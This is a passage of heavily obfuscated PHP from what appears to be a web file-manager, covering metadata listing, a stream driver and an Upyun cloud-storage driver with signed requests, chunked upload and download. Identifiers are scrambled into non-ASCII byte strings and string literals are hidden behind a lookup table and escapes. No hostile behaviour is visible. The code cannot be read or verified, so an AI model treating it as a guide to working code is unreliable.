›½ŠÃ[$½ì¥ùÍ[1951]] = $ç­Û‚[$ ›½ŠÃ[$½ì¥ùÍ[1933]]]; } } unset($ ›½ŠÃ); } private function _listAppendUser(&$§ÏÀ¨·à) { $ƒ‚´É»ä =& $_SERVER[•Ùç É]; $Ö—½Ş—é = array_unique(array_to_keyvalue($§ÏÀ¨·à, $ƒ‚´É»ä[12], $ƒ‚´É»ä[1705])); $Ö—½Ş—é = array_remove_value($Ö—½Ş—é, $ƒ‚´É»ä[214]); if (count($Ö—½Ş—é) == 0) { return; } foreach ($§ÏÀ¨·à as $÷âËµùÂ) { if (isset($÷âËµùÂ[$ƒ‚´É»ä[1951]])) { $Ö—½Ş—é[] = $÷âËµùÂ[$ƒ‚´É»ä[1951]][$ƒ‚´É»ä[1705]]; } } $Ó‰Ìç© = Model($ƒ‚´É»ä[569])->userListInfo($Ö—½Ş—é); foreach ($§ÏÀ¨·à as &$÷âËµùÂ) { $÷âËµùÂ[$ƒ‚´É»ä[632]] = $Ó‰Ìç©[$÷âËµùÂ[$ƒ‚´É»ä[1705]]]; if (isset($÷âËµùÂ[$ƒ‚´É»ä[1951]])) { $÷âËµùÂ[$ƒ‚´É»ä[1951]][$ƒ‚´É»ä[632]] = $Ó‰Ìç©[$÷âËµùÂ[$ƒ‚´É»ä[1951]][$ƒ‚´É»ä[1705]]]; } } unset($÷âËµùÂ); } private function _listAppendMeta(&$¯ÓŠã  ) { $¥Â“­ùÂ =& $_SERVER[•Ùç É]; $Û§À×»¶ = array_unique(array_to_keyvalue($¯ÓŠã  , $¥Â“­ùÂ[12], $¥Â“­ùÂ[1941])); $Û§À×»¶ = array_remove_value($Û§À×»¶, $¥Â“­ùÂ[214]); if (!$Û§À×»¶) { return; } foreach ($¯ÓŠã   as $Óê™™ä) { if (isset($Óê™™ä[$¥Â“­ùÂ[1951]])) { $Û§À×»¶[] = $Óê™™ä[$¥Â“­ùÂ[1951]][$¥Â“­ùÂ[1941]]; } } $‹µö’¡Ø = $this->metaList($Û§À×»¶); if (!$‹µö’¡Ø) { return !1; } foreach ($¯ÓŠã   as &$Óê™™ä) { $Óê™™ä[$¥Â“­ùÂ[509]] = $‹µö’¡Ø[$Óê™™ä[$¥Â“­ùÂ[1941]]]; if (isset($Óê™™ä[$¥Â“­ùÂ[1951]])) { $Óê™™ä[$¥Â“­ùÂ[1951]][$¥Â“­ùÂ[509]] = $‹µö’¡Ø[$Óê™™ä[$¥Â“­ùÂ[1951]][$¥Â“­ùÂ[1941]]]; } } unset($Óê™™ä); } private function metaList($ÈàÈíÌ–) { $‰ìö·ğİ =& $_SERVER[•Ùç É]; if (!$ÈàÈíÌ–) { return array(); } $³Î©ÜÒ = array($‰ìö·ğİ[1941] => array($‰ìö·ğİ[7], $ÈàÈíÌ–)); $·÷îÃ¤® = Model($‰ìö·ğİ[1952])->where($³Î©ÜÒ)->select(); $·÷îÃ¤® = array_to_keyvalue_group($·÷îÃ¤®, $‰ìö·ğİ[1941]); foreach ($·÷îÃ¤® as $ãşĞÖù => $ƒ™×àÒ¢) { $”ÇÌáì = array(); foreach ($ƒ™×àÒ¢ as $¨òšš£) { $”ÇÌáì[$¨òšš£[$‰ìö·ğİ[96]]] = $¨òšš£[$‰ìö·ğİ[420]]; } $·÷îÃ¤®[$ãşĞÖù] = $”ÇÌáì; } return $·÷îÃ¤® ? $·÷îÃ¤® : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\x6c\145\137\x63\x6f\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\163\x65\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e")); } goto DŞÆ”Ñ¬³; B£„í‹ºôÇ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ü×…ğíƒ, $ÁàÔˆÁÌ = 0) { parent::__construct(); $this->source = $ü×…ğíƒ; $this->sourceSize = $ÁàÔˆÁÌ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¥Œğ”œ‰ = false) { return $this->sourceSize; } public function getContent($æ¦†©Œí = false) { return $this->fileSubstr($æ¦†©Œí, 0, $this->sourceSize); } public function fileSubstr($ô¸¾†¾À = false, $Œó‹¬šµ = 0, $»¯¢®¤Û = 0) { if (!$»¯¢®¤Û) { $»¯¢®¤Û = $this->sourceSize; } $¥Ó«ôÑ‰ = $this->sourceSize - $Œó‹¬šµ; if ($»¯¢®¤Û >= $¥Ó«ôÑ‰) { $»¯¢®¤Û = $¥Ó«ôÑ‰; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Œó‹¬šµ, $»¯¢®¤Û); } if ($this->sourceType == self::TYPE_FILE) { if ($»¯¢®¤Û <= 0) { return $_SERVER[•Ùç É][12]; } $Ôí¤Ñ–ş = ftell($this->source); fseek_64($this->source, $Ôí¤Ñ–ş + $Œó‹¬šµ); $‹ã¥¨Ü¡ = @fread($this->source, $»¯¢®¤Û); fseek_64($this->source, $Ôí¤Ñ–ş); return $‹ã¥¨Ü¡; } } public function hashMd5($ì‹¤ëõ÷ = false) { return md5($this->getContent()); } public static function hash($–¾Ãåí½, $ØØ»÷ïô = 0) { $”ø„ß¢Å = new PathDriverStream($–¾Ãåí½, $ØØ»÷ïô); return $”ø„ß¢Å->hashSimple($–¾Ãåí½); } public static function md5($ş‘Ó´éÌ, $ÖÊÍ·é = 0) { $Ñ±àæÅø = new PathDriverStream($ş‘Ó´éÌ, $ÖÊÍ·é); return $Ñ±àæÅø->hashMd5($ş‘Ó´éÌ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\x2f\57\166\x30\x2e\x61\160\151\x2e\x75\x70\171\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÜÕ´ç¼ƒ) { parent::__construct(); $this->_init($ÜÕ´ç¼ƒ); } public function _init($ô÷ÙñÚ») { $Ü´ÕÄØ‚ =& $_SERVER[•Ùç É]; foreach ($ô÷ÙñÚ» as $ÄŠ‘ëÕ¶ => $è©ßİ¹ë) { if (isset($this->{$ÄŠ‘ëÕ¶})) { $this->{$ÄŠ‘ëÕ¶} = $è©ßİ¹ë; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ü´ÕÄØ‚[1492] . LNG($Ü´ÕÄØ‚[1424])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ğ™““‚ø, $í¢µÍ¬ = "\107\x45\x54") { $š±÷·à¿ =& $_SERVER[•Ùç É]; $¡¶³Ãš× = gmdate($š±÷·à¿[1457]); $¸²ÛûÖÚ = base64_encode(hash_hmac($š±÷·à¿[1493], "{$í¢µÍ¬}\x26{$ğ™““‚ø}\x26{$¡¶³Ãš×}", md5("{$this->userpass}"), !0)); $ïš¨Ÿ©® = array("\x41\165\x74\x68\x6f\x72\151\x7a\x61\x74\151\x6f\156\x3a\125\x50\x59\125\116\x20{$this->username}\72{$¸²ÛûÖÚ}", "\104\141\x74\145\72{$¡¶³Ãš×}"); return $ïš¨Ÿ©®; } public function ussRequest($ıŞö‹€, $“ÌÍ¾“˜ = "\107\105\x54", $§šã¾öÕ = false, $—ç˜ÈãŸ = false, $ääˆ´‡— = false) { $ã°Ş¦Ú± =& $_SERVER[•Ùç É]; $ıŞö‹€ = trim($ıŞö‹€, $ã°Ş¦Ú±[8]); $‡á°ÕŒ¨ = "\x2f{$this->bucket}\x2f{$ıŞö‹€}"; $€•« ÉÅ = $this->ussHeaders($‡á°ÕŒ¨, $“ÌÍ¾“˜); if ($—ç˜ÈãŸ) { $€•« ÉÅ = array_merge($€•« ÉÅ, $—ç˜ÈãŸ); } $ŠÍí §Š = url_request($this->endpoint . $‡á°ÕŒ¨, $“ÌÍ¾“˜, $§šã¾öÕ, $€•« ÉÅ, $ääˆ´‡—); if (!$ŠÍí §Š) { return array($ã°Ş¦Ú±[1263] => !1, $ã°Ş¦Ú±[1253] => $ã°Ş¦Ú±[1494]); } if (strtolower($“ÌÍ¾“˜) == $ã°Ş¦Ú±[213] || in_array($ŠÍí §Š[$ã°Ş¦Ú±[1263]], array($ã°Ş¦Ú±[259], $ã°Ş¦Ú±[1495]))) { $§šã¾öÕ = $ŠÍí §Š[$ã°Ş¦Ú±[1496]]; } else { $§šã¾öÕ = json_decode($ŠÍí §Š[$ã°Ş¦Ú±[1253]], !0); if (!$§šã¾öÕ) { $§šã¾öÕ = $ŠÍí §Š[$ã°Ş¦Ú±[1253]]; } else { if (!$ŠÍí §Š[$ã°Ş¦Ú±[795]] && isset($§šã¾öÕ[$ã°Ş¦Ú±[1497]])) { $§šã¾öÕ = $§šã¾öÕ[$ã°Ş¦Ú±[1497]]; } } } return array($ã°Ş¦Ú±[1263] => $ŠÍí §Š[$ã°Ş¦Ú±[795]], $ã°Ş¦Ú±[1253] => $§šã¾öÕ); } public function mkfile($Óäúğé, $ºÚ´Ó  = '', $Š…ı´„ = REPEAT_RENAME) { if ($this->setContent($Óäúğé, $ºÚ´Ó )) { return $this->getPathOuter($Óäúğé); } return !1; } public function mkdir($æ“êûÀ¬, $ñÚğ©° = REPEAT_SKIP) { $¢´¦‚” =& $_SERVER[•Ùç É]; $·õÇ²Ñ¨ = trim($æ“êûÀ¬, $¢´¦‚”[8]); if ($this->_isFolder($·õÇ²Ñ¨)) { return $this->getPathOuter($·õÇ²Ñ¨); } $íÀò¦‡– = array($¢´¦‚”[1498]); $ø´¦ÉÜ† = $this->ussRequest($·õÇ²Ñ¨, $¢´¦‚”[243], !1, $íÀò¦‡–); return $ø´¦ÉÜ†[$¢´¦‚”[1263]] ? $this->getPathOuter($·õÇ²Ñ¨) : !1; } public function copyFile($¦ëë•¼ƒ, $Ê“í¶) { $¿èˆËƒØ =& $_SERVER[•Ùç É]; $úñºáÏ = array($¿èˆËƒØ[1499] . "\57{$this->bucket}\x2f{$¦ëë•¼ƒ}", $¿èˆËƒØ[1500]); $îŠı§¨Î = $this->ussRequest($Ê“í¶, $¿èˆËƒØ[245], !1, $úñºáÏ); return $îŠı§¨Î[$¿èˆËƒØ[1263]] ? !0 : $this->getPathOuter($Ê“í¶); } public function moveFile($¾µ½†Ë“, $¨æ¦¹ÛÂ) { $öç¯æÈ =& $_SERVER[•Ùç É]; $ú¿˜Ø­ê = array($öç¯æÈ[1501] . "\x2f{$this->bucket}\x2f{$¾µ½†Ë“}", $öç¯æÈ[1500]); $ ¾Ê»é = $this->ussRequest($¨æ¦¹ÛÂ, $öç¯æÈ[245], !1, $ú¿˜Ø­ê); return $ ¾Ê»é[$öç¯æÈ[1263]] ? !0 : $this->getPathOuter($¨æ¦¹ÛÂ); } public function delFile($­²Ë„µ•) { $Äìêºİ• =& $_SERVER[•Ùç É]; $Õ”œ¼› = $this->ussRequest($­²Ë„µ•, $Äìêºİ•[1502]); return $Õ”œ¼›[$Äìêºİ•[1263]] ? !0 : !1; } public function delFolder($‡÷Ó’Œû) { $ç¡¥‰Œ¶ =& $_SERVER[•Ùç É]; if (!$this->exist($‡÷Ó’Œû)) { return !0; } $this->listItemCache = !1; $ıæµâ¼Ğ = $‹øÇ¹Êò = array(); $this->fileList($‡÷Ó’Œû, $ıæµâ¼Ğ, $‹øÇ¹Êò, !0); $this->listItemCache = !0; foreach ($‹øÇ¹Êò as $–ÙÑ¤´À) { $ÊŸáø×ò = $this->ussRequest($–ÙÑ¤´À[$ç¡¥‰Œ¶[32]], $ç¡¥‰Œ¶[1502]); if (!$ÊŸáø×ò[$ç¡¥‰Œ¶[1263]]) { return !1; } } foreach ($ıæµâ¼Ğ as $Ÿ˜š‰¸È) { $ÊŸáø×ò = $this->ussRequest($Ÿ˜š‰¸È, $ç¡¥‰Œ¶[1502]); if (!$ÊŸáø×ò[$ç¡¥‰Œ¶[1263]]) { return !1; } } $ÊŸáø×ò = $this->ussRequest($‡÷Ó’Œû, $ç¡¥‰Œ¶[1502]); return $ÊŸáø×ò[$ç¡¥‰Œ¶[1263]]; } public function rename($…Çº«´, $¦¥¹¤Îë) { if ($this->isFile($…Çº«´)) { $¦¥¹¤Îë = get_path_father($…Çº«´) . $¦¥¹¤Îë; return $this->moveFile($…Çº«´, $¦¥¹¤Îë); } return $this->renameObject($…Çº«´, $¦¥¹¤Îë); } public function fileInfo($İüÙ­üû, $ºˆ³©œ‡ = false, $â·ŸÒ‘ = array()) { $É£å‡åŠ =& $_SERVER[•Ùç É]; $¥ô•óš² = array($É£å‡åŠ[32] => $this->pathThis($İüÙ­üû), $É£å‡åŠ[86] => $this->getPathOuter($É£å‡åŠ[8] . $İüÙ­üû), $É£å‡åŠ[33] => $É£å‡åŠ[216], $É£å‡åŠ[78] => isset($â·ŸÒ‘[$É£å‡åŠ[78]]) ? $â·ŸÒ‘[$É£å‡åŠ[78]] : 0, $É£å‡åŠ[177] => $this->ext($İüÙ­üû)); if ($ºˆ³©œ‡) { return $¥ô•óš²; } $¥ô•óš²[$É£å‡åŠ[217]] = $¥ô•óš²[$É£å‡åŠ[87]] = 0; $¥ô•óš²[$É£å‡åŠ[218]] = $¥ô•óš²[$É£å‡åŠ[219]] = !0; if (empty($â·ŸÒ‘)) { $â·ŸÒ‘ = $this->objectMeta($İüÙ­üû); if (!$â·ŸÒ‘) { return $¥ô•óš²; } } $¥ô•óš²[$É£å‡åŠ[217]] = intval($â·ŸÒ‘[$É£å‡åŠ[1503]]); $¥ô•óš²[$É£å‡åŠ[87]] = intval($â·ŸÒ‘[$É£å‡åŠ[1504]]); $¥ô•óš²[$É£å‡åŠ[78]] = $â·ŸÒ‘[$É£å‡åŠ[78]]; return $¥ô•óš²; } public function folderInfo($×­Öô‘–, $¬íÓúô• = false) { $÷¾Øğøµ =& $_SERVER[•Ùç É]; $Ü“³•¥‰ = array($÷¾Øğøµ[32] => $this->pathThis($×­Öô‘–), $÷¾Øğøµ[86] => $this->getPathOuter($÷¾Øğøµ[8] . $×­Öô‘–), $÷¾Øğøµ[33] => $÷¾Øğøµ[77]); if ($¬íÓúô•) { return $Ü“³•¥‰; } $Ü“³•¥‰[$÷¾Øğøµ[217]] = $Ü“³•¥‰[$÷¾Øğøµ[87]] = 0; $Ü“³•¥‰[$÷¾Øğøµ[218]] = $Ü“³•¥‰[$÷¾Øğøµ[219]] = !0; if (empty($Åî­´›)) { $Åî­´› = $this->objectMeta($×­Öô‘–); if (!$Åî­´›) { return $Ü“³•¥‰; } } $Ü“³•¥‰[$÷¾Øğøµ[217]] = intval($Åî­´›[$÷¾Øğøµ[1503]]); $Ü“³•¥‰[$÷¾Øğøµ[87]] = intval($Åî­´›[$÷¾Øğøµ[1504]]); return $Ü“³•¥‰; } private function listObjs($Ãœ¤à³‹, $ñëÈÍĞ„ = 0, $—Ç¨ñ¯Š = 1000) { $¯…øÎùè =& $_SERVER[•Ùç É]; $İ®²ÅÇÂ = array($¯…øÎùè[1505], $¯…øÎùè[1506] . $—Ç¨ñ¯Š); if ($ñëÈÍĞ„) { $İ®²ÅÇÂ[] = $¯…øÎùè[1507] . $ñëÈÍĞ„; } $ëâ¸ìÄ = $this->ussRequest($Ãœ¤à³‹, $¯…øÎùè[247], !1, $İ®²ÅÇÂ); return !$ëâ¸ìÄ[$¯…øÎùè[1263]] ? !1 : $ëâ¸ìÄ[$¯…øÎùè[1253]]; } private function fileList($“şÙ‚°é, &$âü„½¼, &$ù·ÑĞ­, $§…êî = false) { $•Ëòè›÷ =& $_SERVER[•Ùç É]; $ÇŸÇïĞ = $•Ëòè›÷[12]; $²ƒ”¥´ñ = 1000; $¼àµ–¥« = rtrim($“şÙ‚°é, $•Ëòè›÷[8]) . $•Ëòè›÷[8]; while (!0) { check_abort(); $İãÍª‡Í = $this->listObjs($“şÙ‚°é, $ÇŸÇïĞ, $²ƒ”¥´ñ); if (!$İãÍª‡Í) { return !1; } $ÇŸÇïĞ = isset($İãÍª‡Í[$•Ëòè›÷[1508]]) ? $İãÍª‡Í[$•Ëòè›÷[1508]] : $•Ëòè›÷[12]; $Ò˜¬†í = isset($İãÍª‡Í[$•Ëòè›÷[1509]]) ? $İãÍª‡Í[$•Ëòè›÷[1509]] : array(); foreach ($Ò˜¬†í as $‘¡•—®) { $—àƒÓ… = $‘¡•—®[$•Ëòè›÷[33]] == $•Ëòè›÷[77] ? !0 : !1; $õÊ³Ûİâ = ltrim($¼àµ–¥« . $‘¡•—®[$•Ëòè›÷[32]], $•Ëòè›÷[8]) . ($—àƒÓ… ? $•Ëòè›÷[8] : $•Ëòè›÷[12]); $ûÒÙéâ = array($•Ëòè›÷[32] => $õÊ³Ûİâ, $•Ëòè›÷[33] => $—àƒÓ… ? $•Ëòè›÷[77] : $•Ëòè›÷[216], $•Ëòè›÷[78] => $‘¡•—®[$•Ëòè›÷[383]], $•Ëòè›÷[1504] => $‘¡•—®[$•Ëòè›÷[1510]]); $this->cacheMethodInfoSet($õÊ³Ûİâ, $—àƒÓ…, $ûÒÙéâ); if ($—àƒÓ…) { $âü„½¼[] = $õÊ³Ûİâ; if ($§…êî) { $this->fileList($õÊ³Ûİâ, $âü„½¼, $ù·ÑĞ­, $§…êî); } continue; } $ù·ÑĞ­[] = $ûÒÙéâ; } if (count($Ò˜¬†í) < $²ƒ”¥´ñ) { break; } } $this->cacheMethodInfoSet($“şÙ‚°é, !0); } public function listPath($ìÛš´Ş®, $œÆ€óï = false) { $ä±±¶¨Ğ =& $_SERVER[•Ùç É]; $®‡ÁÀ = $Â¶È÷öÍ = array(); $this->fileList($ìÛš´Ş®, $®‡ÁÀ, $Â¶È÷öÍ); foreach ($®‡ÁÀ as $©€Äóİô => $²‚æÅ¦‰) { $®‡ÁÀ[$©€Äóİô] = $this->folderInfo($²‚æÅ¦‰, $œÆ€óï); } foreach ($Â¶È÷öÍ as $©€Äóİô => $²‚æÅ¦‰) { $Â¶È÷öÍ[$©€Äóİô] = $this->fileInfo($²‚æÅ¦‰[$ä±±¶¨Ğ[32]], $œÆ€óï, $²‚æÅ¦‰); } return array($ä±±¶¨Ğ[84] => $®‡ÁÀ, $ä±±¶¨Ğ[85] => $Â¶È÷öÍ); } public function has($ØŸÙâÏ, $ÙÏºï˜° = false, $Î·÷— = true) { $×÷¤ê‡‡ =& $_SERVER[•Ùç É]; $ë·Åç = $×÷¤ê‡‡[12]; $ÖæÖ¢ºô = 500; $şØÊ»™ = 0; $œôß¢²¬ = 0; $ÆÎìøíÕ = rtrim($ØŸÙâÏ, $×÷¤ê‡‡[8]) . $×÷¤ê‡‡[8]; while (!0) { check_abort(); $ü†µ×ĞÙ = $this->listObjs($ØŸÙâÏ, $ë·Åç, $ÖæÖ¢ºô); if (!$ü†µ×ĞÙ) { return !1; } $ë·Åç = isset($ü†µ×ĞÙ[$×÷¤ê‡‡[1508]]) ? $ü†µ×ĞÙ[$×÷¤ê‡‡[1508]] : $×÷¤ê‡‡[12]; $ãÚ´ŞÍ· = isset($ü†µ×ĞÙ[$×÷¤ê‡‡[1509]]) ? $ü†µ×ĞÙ[$×÷¤ê‡‡[1509]] : array(); if (empty($ãÚ´ŞÍ·)) { break; } $±‹’ğóñ = array_filter($ãÚ´ŞÍ·, function ($¬Ì›²°) { $Œîô‚ =& $_SERVER[•Ùç É]; return $¬Ì›²°[$Œîô‚[33]] == $Œîô‚[77]; }); $à†ƒ÷“ú = count($ãÚ´ŞÍ·); $±‹’ğóñ = count($±‹’ğóñ); $Áê¼á­ = $à†ƒ÷“ú - $±‹’ğóñ; if ($ÙÏºï˜°) { $œôß¢²¬ += $±‹’ğóñ; $şØÊ»™ += $Áê¼á­; if ($à†ƒ÷“ú < $ÖæÖ¢ºô) { break; } continue; } if ($Î·÷—) { if ($Áê¼á­) { return !0; } } else { if ($±‹’ğóñ) { return !0; } } if ($à†ƒ÷“ú < $ÖæÖ¢ºô) { break; } } if ($ÙÏºï˜°) { return array($×÷¤ê‡‡[225] => $şØÊ»™, $×÷¤ê‡‡[226] => $œôß¢²¬); } return !1; } public function listAll($‡„Ò…û´) { $¦‚½î¡Ç =& $_SERVER[•Ùç É]; $Âµ±Ï… = $áÃìş«¼ = array(); $this->fileList($‡„Ò…û´, $Âµ±Ï…, $áÃìş«¼, !0); $®ü”åĞ = array_to_keyvalue($áÃìş«¼, $¦‚½î¡Ç[32]); foreach ($Âµ±Ï… as $³‘ì¨†Ú) { if (is_string($³‘ì¨†Ú)) { $®ü”åĞ[$³‘ì¨†Ú] = array($¦‚½î¡Ç[78] => 0); } } return $this->listAllFiles($‡„Ò…û´, $®ü”åĞ); } public function canRead($®´‹øø) { return $this->exist($®´‹øø) ? !0 : !1; } public function canWrite($ÖµÁ¶÷Û) { return $this->exist($ÖµÁ¶÷Û) ? !0 : !1; } public function getContent($¶ç‚•®÷) { return $this->fileSubstr($¶ç‚•®÷, 0, -1); } public function setContent($ì€½ñû, $·Íô¹ù = '') { $¦û§ÚØ =& $_SERVER[•Ùç É]; if (!$·Íô¹ù) { $Û…À‚–Ê = $this->ussRequest($ì€½ñû, $¦û§ÚØ[243]); return $Û…À‚–Ê[$¦û§ÚØ[1263]]; } $åËÑ¶Ò— = $this->tempFile($this->pathThis($ì€½ñû)); file_put_contents($åËÑ¶Ò—, $·Íô¹ù); if ($this->upload($ì€½ñû, $åËÑ¶Ò—)) { $this->tempFileRemve($åËÑ¶Ò—); return !0; } return !1; } public function fileSubstr($ÜÌâÈ¬, $³‡©Ø°‰, $œ¢¡¶âí) { $¢“Û«Ÿ“ =& $_SERVER[•Ùç É]; if (!($³Ÿûòîá = $this->link($ÜÌâÈ¬))) { return !1; } $êöçîµ = !1; if ($œ¢¡¶âí > 0) { $õáé¦ì« = $³‡©Ø°‰ + $œ¢¡¶âí - 1; $êöçîµ = array($¢“Û«Ÿ“[1471] . $³‡©Ø°‰ . $¢“Û«Ÿ“[432] . $õáé¦ì«); } $ÚÃ¼—² = url_request($³Ÿûòîá, $¢“Û«Ÿ“[247], !1, $êöçîµ); return $ÚÃ¼—²[$¢“Û«Ÿ“[795]] ? $ÚÃ¼—²[$¢“Û«Ÿ“[1253]] : !1; } public function upload($òú˜ ‘Ç, $ˆÑ”ÌÔ, $ñİ²óÓË = false, $‘ïÅê€ = REPEAT_REPLACE) { $èÏĞÑŞæ =& $_SERVER[•Ùç É]; $èšÕ¬¸“ = IO::size($ˆÑ”ÌÔ); if ($èšÕ¬¸“ <= 1024 * 1024 * 200) { $¦Ë””•ê = array($èÏĞÑŞæ[1511] . $ˆÑ”ÌÔ); $¯òÚôÄ‹ = $this->ussRequest($òú˜ ‘Ç, $èÏĞÑŞæ[245], $¦Ë””•ê); return $¯òÚôÄ‹[$èÏĞÑŞæ[1263]] ? $this->getPathOuter($òú˜ ‘Ç) : !1; } $‚ğ³ÚÙÎ = 1024 * 1024 * 10; $ûÇÚÈö = array($èÏĞÑŞæ[1512], $èÏĞÑŞæ[1513] . $èšÕ¬¸“, $èÏĞÑŞæ[1514], $èÏĞÑŞæ[1515] . $‚ğ³ÚÙÎ); $¯òÚôÄ‹ = $this->ussRequest($òú˜ ‘Ç, $èÏĞÑŞæ[245], !1, $ûÇÚÈö); if (!$¯òÚôÄ‹[$èÏĞÑŞæ[1263]]) { return !1; } $èÚ‡ª Í = $¯òÚôÄ‹[$èÏĞÑŞæ[1253]]; $®É¥ š¼ = 0; $şãõ“û = $èÚ‡ª Í[$èÏĞÑŞæ[1516]]; $˜§´ÅŠı = fopen($ˆÑ”ÌÔ, $èÏĞÑŞæ[1418]); if (!$˜§´ÅŠı) { return !1; } do { $ıÍŠÂ¾´ = $èÚ‡ª Í[$èÏĞÑŞæ[1517]]; fseek_64($˜§´ÅŠı, $®É¥ š¼); $Ø¿üãîÚ = fread($˜§´ÅŠı, $ıÍŠÂ¾´); $¶ıÖÚş¹ = 0; do { $¶ıÖÚş¹++; $èÚ‡ª Í = $this->uploadPart($òú˜ ‘Ç, $èÚ‡ª Í, $Ø¿üãîÚ); } while (!$èÚ‡ª Í && $¶ıÖÚş¹ < 3); if (!$èÚ‡ª Í) { return !1; } $şãõ“û = $èÚ‡ª Í[$èÏĞÑŞæ[1516]]; $®É¥ š¼ += $ıÍŠÂ¾´; } while ($şãõ“û != -1); fclose($˜§´ÅŠı); $ûÇÚÈö = array($èÏĞÑŞæ[1518], $èÏĞÑŞæ[1519] . $èÚ‡ª Í[$èÏĞÑŞæ[1520]], $èÏĞÑŞæ[1514]); $¯òÚôÄ‹ = $this->ussRequest($òú˜ ‘Ç, $èÏĞÑŞæ[245], !1, $ûÇÚÈö); return $¯òÚôÄ‹[$èÏĞÑŞæ[1263]] ? $this->getPathOuter($¯Üà¬ò) : !1; } private function uploadPart($ö·öÙ, $Ç‡£Ê, &$îş‚’Ê©) { $Ü‘ÒÆÂ§ =& $_SERVER[•Ùç É]; $«Ëù¢¨ê = array($Ü‘ÒÆÂ§[1521], $Ü‘ÒÆÂ§[1519] . $Ç‡£Ê[$Ü‘ÒÆÂ§[1520]], $Ü‘ÒÆÂ§[1522] . $Ç‡£Ê[$Ü‘ÒÆÂ§[1516]], $Ü‘ÒÆÂ§[145] . $Ç‡£Ê[$Ü‘ÒÆÂ§[1517]]); $½ğÀŸ›´ = $this->ussRequest($ö·öÙ, $Ü‘ÒÆÂ§[245], $îş‚’Ê©, $«Ëù¢¨ê); return !$½ğÀŸ›´[$Ü‘ÒÆÂ§[1263]] ? $½ğÀŸ›´[$Ü‘ÒÆÂ§[1263]] : $½ğÀŸ›´[$Ü‘ÒÆÂ§[1253]]; } public function uploadFormData($ÍÓÔ©ûš, $»ë»úÚ¿ = 3600) { return $this->uploadPolicy($ÍÓÔ©ûš, $»ë»úÚ¿); } public function multiUploadFormData($¼¹İ€™™, $Ê£‰§˜„ = 3600) { $ãåØ©·¨ =& $_SERVER[•Ùç É]; $ÑƒÖ›¢î = (int) $GLOBALS[$ãåØ©·¨[7]][$ãåØ©·¨[78]]; return $this->uploadPolicy($¼¹İ€™™, $Ê£‰§˜„, $ÑƒÖ›¢î); } private function uploadPolicy($ÀÎÖÄ‰î, $Šú¬±ò = 3600, $Šè‚Îáõ = 0) { $¿õßúµ =& $_SERVER[•Ùç É]; $óŞû·ƒÆ = $¿õßúµ[8] . $this->bucket; $›Á–Æä© = gmdate($¿õßúµ[1457]); $Ò—áºı = array($¿õßúµ[1523] => $this->bucket, $¿õßúµ[1524] => $ÀÎÖÄ‰î, $¿õßúµ[1525] => time() + $Šú¬±ò, $¿õßúµ[1526] => $›Á–Æä©); if ($Šè‚Îáõ) { $Ò—áºı[$¿õßúµ[1438]] = $Šè‚Îáõ; } $À°İÀÔÂ = base64_encode(json_encode($Ò—áºı)); $‚›ïğ…¾ = base64_encode(hash_hmac($¿õßúµ[1493], "\120\x4f\x53\x54\x26{$óŞû·ƒÆ}\46{$›Á–Æä©}\x26{$À°İÀÔÂ}", md5("{$this->userpass}"), !0)); $ææ­éı´ = array($¿õßúµ[278] => $À°İÀÔÂ, $¿õßúµ[1527] => "\x55\120\131\x55\116\x20{$this->username}\72{$‚›ïğ…¾}", $¿õßúµ[198] => $this->endpoint . $óŞû·ƒÆ); return $ææ­éı´; } public function download($¤¥şªãÌ, $¯“’Âµ¥) { $çŸÆëáõ = IO::getPathInner(IO::mkfile($¯“’Âµ¥)); if (!($ëÀ¦²¯Õ = $this->link($¤¥şªãÌ))) { return !1; } $‡ØĞÏÌï = 0; $ìúŸÁÚ½ = 1024 * 200; $©«¨Œá© = fopen($çŸÆëáõ, $_SERVER[•Ùç É][1477]); while (!0) { $˜˜¦àÎü = $this->fileSubstr($¤¥şªãÌ, $‡ØĞÏÌï, $ìúŸÁÚ½); if ($˜˜¦àÎü === !1) { return !1; } fwrite($©«¨Œá©, $˜˜¦àÎü); $‡ØĞÏÌï += $ìúŸÁÚ½; if (strlen($˜˜¦àÎü) < $ìúŸÁÚ½) { break; } } fclose($©«¨Œá©); return $¯“’Âµ¥; } public function link($şßûÀ¼Ø, $§«û³Ø’ = array()) { $İ€‰ÅğË =& $_SERVER[•Ùç É]; $şßûÀ¼Ø = trim($şßûÀ¼Ø, $İ€‰ÅğË[8]); if (!empty($this->token)) { $±ğ¤ÆïÂ = strtotime(date($İ€‰ÅğË[1528])); $€êÕ³™¦ = substr(md5($this->token . $İ€‰ÅğË[330] . $±ğ¤ÆïÂ . $İ€‰ÅğË[1529] . $şßûÀ¼Ø), 12, 8) . $±ğ¤ÆïÂ; $§«û³Ø’[] = $İ€‰ÅğË[1530] . $€êÕ³™¦; } $£ÎÃÔ´Ø = !empty($§«û³Ø’) ? $İ€‰ÅğË[75] . implode($İ€‰ÅğË[330], $§«û³Ø’) : $İ€‰ÅğË[12]; return $this->getHost() . $İ€‰ÅğË[8] . $şßûÀ¼Ø . $£ÎÃÔ´Ø; } public function fileOut($ÓÖë¨£, $‡€áç´³ = false, $ÉêÑûº = false, $Î¹Ş”ë• = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÓÖë¨£, $‡€áç´³, $ÉêÑûº, $Î¹Ş”ë•); } if (!$ÉêÑûº) { $ÉêÑûº = $this->pathThis($ÓÖë¨£); } $¼¤Ö’øê = $‡€áç´³ ? array($_SERVER[•Ùç É][1531] . rawurlencode($ÉêÑûº)) : array(); $†Çàûú¿ = $this->link($ÓÖë¨£, $¼¤Ö’øê); $this->fileOutLink($†Çàûú¿); } public function fileOutServer($ü†µ‰Øù, $°û¹¸ñ = false, 